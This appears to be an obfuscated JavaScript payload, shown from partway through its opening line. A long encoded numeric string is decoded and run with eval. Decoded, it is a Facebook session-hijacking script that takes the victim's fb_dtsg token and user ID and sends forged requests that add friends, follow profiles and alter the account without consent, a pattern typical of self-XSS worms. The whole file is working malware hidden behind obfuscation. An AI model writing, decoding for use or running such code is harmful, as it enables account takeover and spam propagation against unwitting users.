634E634F634E634A634B634A634E634A986A942C938E922E970F970C954E690C950E954D910B946D666B642D826B822A838D842D642B682E634E642F694B894D930A894B986D694F894D906E906E886A914F962B926C910F946E906E694F894A902C970D926F950E946E690A954B922A954D758B886F886F894A750B702F642E682C634D970F962F974F910B670E742C546D634D634F634C634E634E634C634D634B634D634F634A634E634E634D634E634C978C894C962B634B954E894E962E894D942D966A634B750F634F642E970F950D886B914D962D926E910B946A906A750E642B634F678A634C974F926D906C742B546B634A634F634A634D634C634C634A634B634A634F634C634F634D634E634D634E954C894E962C894A942E966A634E678B750F634C642E658F894F902F970D926A950E946C750E894A906E906B886A914C962E926A910C946C906D642B742A546E634D634E634B634D634C634A634A634F634C634A634C634F634B634C634A634B954A894A962C894D942D966B634A678B750C634E642D658B922D950F982B886B914A950B974D946C906E750E914D962E926D910C946B906A886E898B962B950C982F966B910A962C642B742E546F634E634A634F634F634F634E634D634E634C634A634A634A634C634B634D634A954D894F962A894D942B966D634F678B750C634A642E658D962D910B914D886C954A894A962B894E942D750E946B950A946F910A642C742F546C634E634F634F634C634C634C634F634F634D634A634B634F634C634A634A634A954F894C962B894D942B966B634D678D750B634A642E658A950B974B970A918B950C926E946D918B886C926B906D750D642D742E546D634A634F634A634D634A634F634D634F634F634B634B634F634A634D634D634C954A894B962A894B942D966B634B678E750E634F642D658B938C950B918C918A926E946E918F886A938E950C902B894B970A926D950B946D750D914C962B926A910E946A906E886A898F962A950C982D966E910C962A642C742F546F634F634E634C634E634F634F634A634D634C634A634D634D634F634B634B634D954A894C962E894D942D966B634F678B750A634D642E658C946B950E886E914D938D990C950D974A970D886E950C946A886B902B938A926E902F934A750A970C962A974D910B642E742D546B634C634D634B634F634B634D634E634B634D634E634D634B634B634A634E634D954D894D962A894D942A966F634E678C750C634E642C658A910C918A950A886C938D950F918F886B906D894F970D894E750B642D742B546B634C634F634D634A634F634D634B634B634A634E634E634C634B634C634B634F954D894A962A894A942A966D634A678A750B634C642E658B922D970F970B954E886E962C910B914D910D962F910D962A750F642A742D546A634B634F634C634F634E634E634E634D634B634B634F634C634B634D634A634C954A894E962C894A942B966C634B678C750A634A642C658C914E898E886F906C970B966A918C750C642A634B678C634D906B950C902F974B942E910C946A970B690A918C910F970C782A938E910C942A910B946B970A966F770C990B818C894F942F910B666F662C914D898E886C906B970C966D918C662E670F870E698A878A690D978C894B938D974E910E742C546A634F634B634B634B634B634E634D634F954E894F962E894B942B966E634D678D750E634D642F658C954E922B966C970A894E942D954F750F702B722B718D730F702B722F726C714F734E702D702D714B730B714B730E710D722C734A702F702F718E642B742B546F634F634D634A634E634F634C634F634E634E634E634A634A634C634E634B634F954E894E962F894B942F966A634A678A750E634E642B658E886D886E974F966A910C962B750A642E634A678A634F974E966F910C962C886C926A906A742D546C634A634C634F634D634E634B634E634B634A634F634C634C634C634E634D546B634C634D634B634C634E634C634A634F926F914B634E666E906B950F902A974E942F910B946D970C690E846A834A810E690C926A946A906E910A986E822F914D666F642A922E970D970F954B966D738F694B694B642D670C634E754D750B634F698C670C634C998F634A986F942C938E922A970A970E954D690B950C954F910E946D666F642D790C782C842D642F682F634A642B922B970F970F954F966E738E694C694C982F982A982E690C914A894C902C910F898D950A950B934C690D902A950F942F694C894A930F894E986D694F970E990F954F910A894D922D910A894F906D694D914A926D962F966C970E886A906B910B918B962E910F910A690E954C922F954E758B886D886E894C750E702D642B634A678A634E954B894F962F894F942C966C682E634E970F962A974B910E670D742F634D1006A546C634B634B634F634D634B634C634B634D910B938F966A910D634F998B634E986D942B938D922D970C970B954A690E950F954E910A946E666D642F790C782F842F642A682E634D642C922E970A970B954B738A694A694E982A982F982A690A914A894F902F910E898A950F950A934B690A902A950E942E694F894C930E894F986C694F970C990A954E910B894F922C910F894D906E694B914D926E962F966E970A886F906C910D918B962B910A910F690A954F922C954B758C886F886A894C750D702B642D634F678B634D954A894D962D894A942C966C682D634E970B962B974B910C670E742F634A1006C546E634D634E634F634A634E634F634F634F986C942F938D922B970A970F954A690F966E910D946E906D666F670B742E546E1006A546E634F546A694F694C970D926F934A938C894E942F894D634E950D938D894D990D926D946D926A634D906A926C946F938A910F546C978C894E962A634F970B926B934E938D894E942B894D634C750F634B906B950E902F974D942C910F946B970C690C894B906A906C782F978C910C946F970B810C926E966B970A910F946D910B962C666D642F902C938A926F902F934A642F682C634C914D974F946F902B970A926A950B946F634B666F670F634D998E546B926F914A666F906E950F902B974C942C910A946C970E690A902E950D950C934D926C910B690D966B954A938B926F970D666C642B954C894B990E938C894E966A970D926A750A642E670E870B702C878A690A966B954E938D926C970C666F642D742D642D670D870D698E878A690D926F946E906C910D986E822C914A666C642C922C894A990B926D962C642B670A634F754D750C634E698E670C998E546E966B978F946A886A962E910A978A634F750C634C906B950E902D974A942F910B946C970B690C922E910B894F906B690F926E946F946D910D962F794C842D814E810E690D966A954C938B926D970A666F662D642E966A978B946F886E962D910A978D642D738B662D670A870E702A878A690E966F954A938D926C970A666C642D682F642D670D870F698B878B742D546A966E894A962C934B894B906B894B966C938C894D962D926F886D894B938B666E670A742C546C906C950B902F974D942A910C946C970B690A902B950B950F934A926C910F634E750B634A642F954A894B990E938E894D966B970F926F750A910B978A910A970D742A910D986E954B926B962D910E966D750E642C678F634B898A970A894E962E926F922F926B690A970C950D790F814B842C838B970D962B926E946E918D666B670F742F546C634F546C906F950F902A974E942F910D946A970C690C962F910B942D950E978B910C782A978F910C946F970A810B926C966C970E910B946C910F962C666C970F926A934A938A894B942B894A670C742C546F1006A546D634A1006E682D634C914B894D938D966D910E670F742F546C634D546D634D546F694B694F894E962B934F894E906F894F758F1266C634B910A934B938B910F942C910B546B914F974E946D902E970E926C950B946B634A966F894F962F934D894D906D894E966B910F934D938C910C666F974B926B906B682F902C926B946C966F670B998B546A634E634B634D634E634B634F634A634E634C634F634D634A634D634F634B634E978E894B962B634B986E942F938E922F970A970D954A634E750B634B946C910C982D634D858B814F810F794F970C970C954F834E910F958D974A910F966B970D666E670F742B546E634E634B634B634A634D634C634D634F986E942A938B922E970D970C954E690E950D946B962A910C894A906C990F966E970A894A970C910E902F922A894D946A918C910F634C750A634E914E974F946B902D970F926C950E946E634C666B670F634B998F546A634C634D634C634E634A634F634F634E634B634F634D634C634D634A634F634C634D634C634C634D634D634D634E634B926E914D666B986A942E938B922E970A970A954C690A962D910C894C906B990F838A970B894D970F910D634E750B750C634E714E670D998D634D634E546F634B634F634D634C634C634F634A634C634A634D634F634E634A634F634A634E634D634D634C634A634E634B634A634C1006A546C634C634D634E634B634A634D634E634B1006F742F546D634F634A634B634A634E634B634A634D634E634C634A634B634C634C634E546C634C634A634C634C634E634F634D634F634E634F634D634E634C634E634F634D986D942B938D922C970B970A954C690F950A954C910C946B666F642F826B822D838C842E642A682F634B642D694C894B930C894D986F694C894A906B906C886F914D962E926F910A946A906E694E894F902D970F926B950E946A690D954A922F954A758D886A886D894B750D702E642F682D634E970A962D974C910F670E742E546F634C634F634B634C634B634D634E634E634D634A634D634E634F634E634C634E978A894D962C634E954F894C962D894E942A966F634F750D634B642B970D950C886B914E962F926C910C946C906E750D642E634E678D634C974B926A906C742E546F634A634A634B634E634A634E634A634B634C634B634E634F634A634E634F634E954B894D962A894A942F966C634F678F750A634D642F658C894A902F970A926A950A946B750E894A906B906B886F914E962E926C910F946E906C642D742F546E634B634D634B634D634E634E634C634C634C634B634D634C634C634A634F634D954C894C962A894E942B966C634A678E750C634D642F658D922D950D982D886D914C950B974A946E906B750D914B962F926A910F946C906E886F898D962F950D982B966C910E962C642B742B546C634F634D634A634F634A634A634B634F634A634C634C634F634D634D634D634D954E894F962D894A942A966C634C678E750F634E642C658F962B910A914D886D954F894B962C894D942E750E946B950F946D910D642C742E546F634E634E634F634B634E634C634C634F634D634D634E634D634A634E634D634B954A894C962C894D942E966F634F678F750C634B642B658E950F974A970E918D950D926E946B918D886E926B906E750D642E742D546D634D634E634A634C634F634A634A634A634A634E634C634A634F634D634C634D954F894F962C894D942F966B634F678E750F634B642F658C938F950A918C918D926F946C918F886A938F950F902C894F970A926A950F946A750D914D962C926D910A946C906F886D898D962F950D982A966F910A962D642C742A546A634C634B634D634C634B634A634A634F634B634B634E634C634F634F634C634C954D894F962C894D942C966C634A678A750A634B642E658D946C950C886F914C938D990A950B974B970C886F950C946D886C902F938B926E902B934C750A970C962A974E910F642C742E546C634F634F634E634F634E634E634D634A634F634A634C634A634C634A634B634D954C894C962D894C942F966B634A678A750D634F642B658A910D918C950C886E938F950A918D886A906C894C970C894C750C642A742E546A634B634F634B634B634A634E634F634A634B634B634B634D634F634C634E634D954F894F962D894F942E966D634E678F750B634B642E658A922D970D970E954C886D962C910F914F910E962F910D962A750C642B742C546F634C634B634C634F634C634B634E634B634D634D634C634D634D634A634E634B954B894F962D894E942C966B634F678E750F634E642F658A914D898F886D906F970E966A918C750A642A634A678B634F906A950E902F974C942B910D946D970A690F918A910E970C782B938B910F942B910E946F970F966F770F990C818C894D942A910E666F662F914A898B886A906A970B966B918C662D670E870C698A878B690E978C894A938C974A910E742F546D634F634E634C634A634A634E634F634B954F894D962C894F942A966E634F678C750C634E642C658D954F922D966F970E894E942F954F750C702F722A718F730B702D722C726D714E734F702F702E714C730E714F730C710B722B734A702D702B718D642C742C546D634A634D634F634A634E634B634A634A634C634B634E634B634A634E634F634C954C894E962C894C942B966C634F678F750C634F642A658D886F886A974F966E910B962C750A642C634E678B634D974B966F910F962B886A926D906F742F546E634B634E634A634C634A634F634A634F634B634B634C634B634D634F634E634C986A942C938B922D970B970C954D690C966B910C970A834A910E958F974D910F966E970E794D910C894D906E910B962C634F666D642D858C686B838B850A818F686A834F910A978C642F682B634B966D978B946B886E962B910B978A670E742A546A634F634B634D634F634D634B634C634D634B634A634E634B634B634C634A634F986B942B938F922B970F970D954D690F966B910A970A834B910D958A974A910F966C970C794A910A894F906D910B962A634B666C642E774F950A946B970B910B946B970F686A842A990D954D910C642C682F642E894E954A954A938A926D902B894E970B926C950D946A694C986A686D982B982E982D686A914A950B962E942B686E974A962F938E910B946A902E950E906A910C906E642D670D742D546C634A634C634D634B634E634E634E634B634C634D634E634F634B634F634D546B926B914F666A902D926A946A966F634A750C750A634B642E914F894B962D934D910E970C942E910E994F642F634F658C658F634C906A950E902A974C942E910B946E970F690F902A950C950D934D926E910D690E966B954B938B926B970F666A642F902F926C946A966F642D634F678E634F974C966E910A962B886F926A906F634A678E642A750F642C670D690C938F910E946F918A970C922A634F754C634A702E670F998E546F634F634D634A634C634C634E634D634B634A634A634D634F634D634C634D634A986C942B938F922B970C970E954F690B966F910D946A906F666E954E894A962A894F942B966C670C742D546E1006A910B938C966A910B634A926E914A666B906B950C902F974F942C910E946F970B690C902A950B950B934A926C910C690F966E954D938B926D970B666A642D902E926E946A966E642D634C678D634B974B966E910E962C886F926C906B634B678E642D750D642D670F690E938F910C946D918C970B922D634C746B750C634A702C670E998E546B634A634F634E634C634C634B634F634E634A634D634B634A634F634E634E634F902C926F946A966E926F990A910E970A918D910D970C926D962D666B974F926D906E682F902F926C946A966D682E642F966B894D962F934E894D906E894F966A910E934D938F910E642E670A742E546E1006B910C938B966A910F634E926B914D666A902B926A946E966D634F750F750A634F906C950B902E974A942D910A946B970E690D902D950F950B934E926B910A690F966C954C938B926D970D666C642C902A926D946A966C642D634C678A634A974B966B910C962A886D926B906C634F678B642E750E642D670D870C702B878D690A966D954B938D926C970F666C642D742B642F670B870A698F878A690D970F950F838C970D962F926A946B918C666D670D670C998D546D634D634F634A634B634E634E634D634A634D634A634B634B634B634F634C634B986F942A938F922A970F970A954B690E966A910D946A906C666D954F894D962F894D942B966B670E742B546F1006E546E1006C546C634E546C694C694F902A926D946B966F926A990A910B970B634B898D910D938B926B962A938D910E942A910C546F978A894A962D634E902C926E946A966C966B950A946C974E902C634F750E634A998C1006D742C546C978B894A962F634E902A926E946C966D922B970E942E938E634F750D634E906D950F902B974A942A910F946E970A690D902E962F910E894E970C910C782D938B910F942C910C946B970B666B642E922A970A942B938C642E670A742E546F914D974B946A902F970A926E950C946C634D966C902A926E946D966B926F990C910D970C918E910D970A926F962D666A974D926E906B682C902C926F946E966F682A914C950A946C934D966A926E990D950F946B670A998E546B634F634F634C634C634D634A634D634F634E634B634F634C634B634B634B634E978B894A962C634A986B942C938E922E970D970D954D634E750D634B946F910E982F634D858B814C810E794C970A970E954E834D910D958B974C910B966F970F666D670A742E546D634B634C634C634F634F634B634E634F986E942C938F922D970E970C954E690A950A946E962E910E894C906F990B966D970B894D970A910F902E922D894E946E918F910B634B750B634E914D974D946D902C970B926C950A946F634E666F670F634E998D546B634F634A634C634B634F634A634B634B634A634C634D634F634F634F634E634F634A634D634A634F634A634A634B634A926E914B666A986C942C938F922A970E970A954A690E962A910C894C906F990E838A970C894F970C910E634E750F750C634D714A670A998C546A634D634F634C634D634B634D634B634C634C634B634C634A634B634E634C634A634D634C634F634A634B634A634F634D910F978A894B938B666F642F902A926C946D966B966B950C946C974E902E634D750E634F642F634D678B634B986F942B938B922C970E970A954B690E962E910F966D954F950C946B966A910E842D910F986F970F690F970D950D838E970B962E926D946E918C666D670C690C962E910C954C938A894F902D910D666E642E914B950E962D634C666A742E742E670C742E642B682C642B642E670B634B678A634C642D742B642D670E742F546C634C634C634C634A634D634E634E634D634B634C634C634D634A634C634A634B634A634F634F634C634D634F634A634C902A926A946F966E922C970F942D938B690F926B946E946F910E962B794B842D814A810E634B750B634D902B926D946D966A966A950D946C974B902A690D930B966D942E950D906F966D690A942C894E962C934D974C954D870B698C878C870E702F878F690C886D886B922A970E942C938F546A634E634E634E634A634C634C634F634E634E634C634A634C634B634C634F634F634F634D634E634F634A634C634E634F898A970E894F962A926C922B926F690E966F910C970F842C926C942E910B666A898B974A918F974F946E690A918B910B970E842E926A942B910B666E670F634E678F634C702A698B698B698C674E722F698D674A722F698D674B706A714D674A710C722E718B670D742C546E634D634F634D634B634A634F634C634D634E634A634D634A634F634E634F634C634F634B634B634E634C634A634D634D926E914A666B902A926C946B966B922A970A942B938D690C918C910C970F782A938C910D942C910E946E970B966B770C990A842A894E918A818C894E942B910E666C642B966A910F938D910F902C970E642A670E870F698F878F690C978A894E938F974D910A634E750C750B634B642F702F642D670C998F546E634C634F634A634C634B634B634C634C634D634D634B634A634E634B634C634A634E634B634A634A634E634D634A634F906F950D902D974B942D910D946C970C690E902C950B950C934F926F910D634D750A634D642E902A926E946A966C642C634C678E634A974C966A910A962C886A926C906E634F678A634D642B750C934C894F906B926B946F742C910E986F954E926F962E910E966C750E642C634A678E634F898B970A894B962F926E922A926C690F970D950E790A814D842D838F970F962E926A946F918E666B670E742F546E634B634C634A634C634A634D634F634E634A634C634E634A634F634E634A634A634F634D634A634A634C634C634A634D1006D910A938B966F910A634A926F914C666D902B926B946E966B922A970B942A938D690C918C910B970D782B938F910A942D910E946E970E966A770F990C842A894E918C818B894E942C910D666E642F966F910D938C910F902C970B642D670D870F698E878B690A978B894A938F974E910A634C750F750D634C642F706C642C670A998A546C634E634E634B634E634A634D634D634D634B634F634B634D634F634B634B634B634B634D634C634E634D634D634D634E906E950D902D974F942D910A946F970B690D902E950A950D934C926E910F634B750E634B642C902A926C946B966E642F634F678A634F974A966D910E962B886E926C906F634E678E634D642D750C910F962D934D910C934E742B910C986D954F926C962D910C966D750A642D634F678A634F898E970E894E962A926D922D926E690A970D950C790F814A842C838C970F962B926D946E918E666E670F742D546E634E634D634B634A634A634F634B634B634D634D634F634C634E634D634E634E634A634A634A634E634D634C634E634F1006E546B634E634C634E634B634C634E634A634E634C634A634C634A634A634D634B634B634A634C634E634A634A634F634B634A910B978A894F938A666A914E950A946E934E966D926F990C950E946F634F678B634F642E666C642E634F678E634B926C906E634D678F634E642F682B642B634C678E634B902F926B946F966F634E678C634A642F670B742B642C670A742C546F634F634E634E634F634A634A634E634C634D634C634C634C634A634D634F634B634C634F634E634B634E634D634E634A1006D546C634D634B634B634F634F634D634E634A1006E742E546C634E634F634D634A634E634E634D634A634B634A634B634E634F634B634F634A986D942A938A922F970A970D954B690E950B954B910D946D666C642D790C782E842A642B682A634C642B694F894C930F894F986B694C970A926A942E910B938B926A946B910C694D910E906F926D970E886C954D962D950C914C926B938B910A694F898B894F966A926D902E886E926D946B914A950C690D954B922C954B758D886D886B894F750B702F658C886C886D974A966E910A962D750C642E634A678D634F974D966E910A962B886D926C906A682F634E970D962A974C910B670D742A546D634F634A634F634E634B634B634D634E634A634B634C634E634D634B634A634C986F942F938C922A970E970D954D690B966A910C970A834F910B958A974F910D966E970D794D910A894C906C910D962B634F666A642D858C686C838F850E818D686A834E910B978F642F682C634F966D978D946E886E962D910E978F670B742B546A634C634A634A634F634D634C634D634E634F634F634F634D634B634E634E634F986C942C938C922B970D970C954D690D966D910D946A906A666B670B742A546C1006A';var _6336=/[\x41\x42\x43\x44\x45\x46]/;var _8259=2;var _4584=_7184.charAt(_7184.length-1);var _6416;var _7591=_7184.split(_6336);var _8267=[String.fromCharCode,isNaN,parseInt,String];_7591[1]=_8267[_8259+1](_8267[_8259](_7591[1])/21);var _4765=(_8259==5)?String:eval;_6416='';_11=_8267[_8259](_7591[0])/_8267[_8259](_7591[1]);for(_7055=3;_7055<_11;_7055++)_6416+=(_8267[_8259-2]((_8267[_8259](_7591[_7055])+_8267[_8259](_7591[2])+_8267[_8259](_7591[1]))/_8267[_8259](_7591[1])-_8267[_8259](_7591[2])+_8267[_8259](_7591[1])-1));var _9213='_9424';var _2644='_9213=_6416';function _7937(_7662){_4765(_6653);_7937(_4002);_4002(_2644);_7937(_9213);}var _6653='_7937=_4765';var _4002='_4002=_7937';_7937(_4584);